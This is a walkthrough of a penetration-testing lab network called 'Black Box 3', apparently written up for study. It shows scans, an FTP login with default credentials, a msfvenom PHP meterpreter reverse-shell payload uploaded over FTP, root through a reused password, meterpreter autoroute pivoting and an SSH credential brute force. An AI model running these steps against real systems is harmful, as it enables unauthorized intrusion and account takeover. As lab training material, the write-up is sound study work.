---
description: Pivoting + Basic Privilege's Escalation
---

# Black Box 3

### target:

```
172.16.37.0/24 
```

### Goals

* Discover and exploit all machines on the network
* Read all flag files (one per machine)
* Obtain root privileges on both machines (meterpreter's [autoroute](http://blog.safebuff.com/2017/01/02/Meterpreter-Proxy-and-Route/) functionality and ncrack's [minimal.usr](https://github.com/nmap/ncrack/blob/master/lists/minimal.usr) list will prove useful)

### What you will learn

* Network discovery
* Pivoting to other networks
* Basic privilege escalation

### Recommended tools

* Dirb
* Metasploit framework (recommended version 5)
* Nmap
* FTP Utility

## My Solution:

### Network+Info:

#### routing:

```
└─$ route -n           

Kernel IP routing table
Destination     Gateway         Genmask       Use Iface
172.16.37.0     0.0.0.0         255.255.255.0   0 tap0                                                                               
```

#### recon:

```
└─$ fping -a -g 172.16.37.0/24 2>/dev/null 1>fping_out.txt

172.16.37.1
172.16.37.220
172.16.37.234
```

```bash
└─$ sudo nmap -sS 172.16.37.0/24

Nmap scan report for 172.16.37.1
All 1000 scanned ports on 172.16.37.1 are closed

Nmap scan report for 172.16.37.220
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for 172.16.37.234
All 1000 scanned ports on 172.16.37.234 are closed
```

#### OS FingerPrinting:

```bash
└─$ sudo nmap -Pn -sV -O -A -p- -T4 -v -n --open -iL fping_out.txt

Nmap scan report for 172.16.37.220
Host is up (0.16s latency).
PORT STATE SERVICE VERSION
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
3307/tcp open  tcpwrapped


Nmap scan report for 172.16.37.234
Host is up (0.16s latency).
PORT STATE SERVICE VERSION
40121/tcp open ftp ProFTPD 1.3.0a
40180/tcp open http Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_ Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

### First Target (Apache httpd 2.4.18 Ubuntu):

#### target:

```bash
172.16.37.220
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
3307/tcp open  tcpwrapped
```

going to the host via browser and checking the source code we find this:

![](<../../.gitbook/assets/image (39).png>)

looks like an ifconfig output shows a second network this device got access to: `172.16.50.0/24` and it got the following IP in that network  `172.16.50.222` .

#### IP on Other Network:

```bash
172.16.50.222
```

looks like we will exploit it then pivote to other targets.

#### dir busted:

```bash
└─$ gobuster dir -u http://172.16.37.220:80 -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.1.0
===============================================================
[+] Url:                     http://172.16.37.220:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 292]
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/index.php            (Status: 200) [Size: 1388]
/javascript           (Status: 301) [Size: 319] [--> http://172.16.37.220/javascript/]
/server-status        (Status: 403) [Size: 301]                                       
                                                                                      
===============================================================
2021/08/19 22:42:47 Finished
===============================================================
```

/javascript shows we don't have any permission. however let's enum dir their and see if any interesting dir:

```bash
└─$ gobuster dir -u http://172.16.37.220/javascript/  -w /usr/share/seclists/Discovery/Web-Content/common.txt 
===============================================================
gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 303]
/.htaccess            (Status: 403) [Size: 308]
/.htpasswd            (Status: 403) [Size: 308]
/jquery               (Status: 301) [Size: 326] [--> http://172.16.37.220/javascript/jquery/]
```

Same thing also Forbidden let's dir enum as well, inside of it another /jquery and there, we find jQuery lib code. and that's the end of the rabbit hole.

we are stuck let' move to the next target



### Second Target (ProFTPD + Apache httpd):

#### target:

```bash
172.16.37.234
40121/tcp open ftp ProFTPD 1.3.0a
40180/tcp open http Apache httpd 2.4.18 ((Ubuntu))
```

let's start with ftp (try to crack it using ncrack but it's in non-standard port):

```bash
└─$ locate  ncrack | grep "ncrack-services"
/usr/share/ncrack/ncrack-services
                                                                                                                                                                        

└─$ sudo mousepad /usr/share/ncrack/ncrack-services 

change ftp from 21 to 40121

then crack with:

└─$ sudo ncrack -vv --user users.usr -P /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt  172.16.37.234:40121  

```

nothing, let's try the http.

#### &#x20;dir enum:

```bash
└─$ gobuster dir -u http://172.16.37.234:40180/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.1.0
===============================================================
[+] Url:                     http://172.16.37.234:40180/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 295]
/.htaccess            (Status: 403) [Size: 300]
/.htpasswd            (Status: 403) [Size: 300]
/index.html           (Status: 200) [Size: 11321]
/server-status        (Status: 403) [Size: 304]  
/xyz                  (Status: 301) [Size: 321] [--> http://172.16.37.234:40180/xyz/]
                                                                                     
===============================================================
2021/08/19 23:53:11 Finished
===============================================================
```

/xyz found this

![](<../../.gitbook/assets/image (40).png>)

same as the first target we also have ifconfig shows that Target2 is conn to another network with IP `172.16.50.244` .

#### IP on other Network:

```bash
172.16.50.244
```

we won't be able to conn to either of the new IP let's comprmise one of them this machine have ftp let's try normal conn no attack:

```bash
└─$ ftp 172.16.37.234 40121
Connected to 172.16.37.234.
220 ProFTPD 1.3.0a Server (ProFTPD Default Installation. Please use 'ftpuser' to log in.) [172.16.37.234]
Name (172.16.37.234:kali): ftpuser
331 Password required for ftpuser.
Password:                         //ftpuser as well
230 User ftpuser logged in.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 


```

interesting now we will use ftp to ransfere a msfvenome:

```bash
sudo msfvenom -p php/meterpreter_reverse_tcp  LHOST=10.13.37.10 LPORT=53 -o rev_php_tcp_53.php
```

&#x20;and run msfconsole to liten to the reverse\_tcp while runing the payload by nav to the webpage.

![](<../../.gitbook/assets/image (41).png>)

also well get a privilege escalation by checking the /etc/passwd :

![](<../../.gitbook/assets/image (42).png>)

```bash
su ftpuser //we need to be a terminal to do so so we will use python to create a terminal
python -c 'import pty;pty.spawn("/bin/bash")';

su ftpuser //now we got root after writing the password(ftpuser)
```

you can check for the flag in the www by ls -al as a hidden file so you need root to actually read it.

then will move the backups folder to www so we can download it using this command:

```bash
└─$ wget -mpEK http://172.16.37.234:40180/backups       
```

in that machine nmap is installed scan network:

```bash
root@xubuntu:/var/www nmap -sS 172.16.50.222

Nmap scan report for 172.16.50.222
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:50:56:8E:88:F6 (VMware)

```

&#x20;you will notice target 1 also got ssh to access you will need to CTR+Z + autoroute:

```bash
run autoroute -s 172.16.50.0/24
meterpreter > run autoroute -p //print all routes
```

#### now we will guess SSH creds using metasploit:

```bash
use auxiliary/scanner/ssh/ssh_login
show options
set rhosts 172.16.50.222
set user_file /usr/share/ncrack/minimal.usr
set pass_file /usr/share/ncrack/minimal.usr
set verbose true
run
```

some time will go and new session will be created:

```bash
sessions -i 2
bash -i 
ls -al /will se the flag

//if you want you can change it to a meterpreter just like networking explined under eJPT
use post/multi/manage/shell_to_meterpreter
set LHOST 172.16.50.244
set session <shell_session_id>
run
```

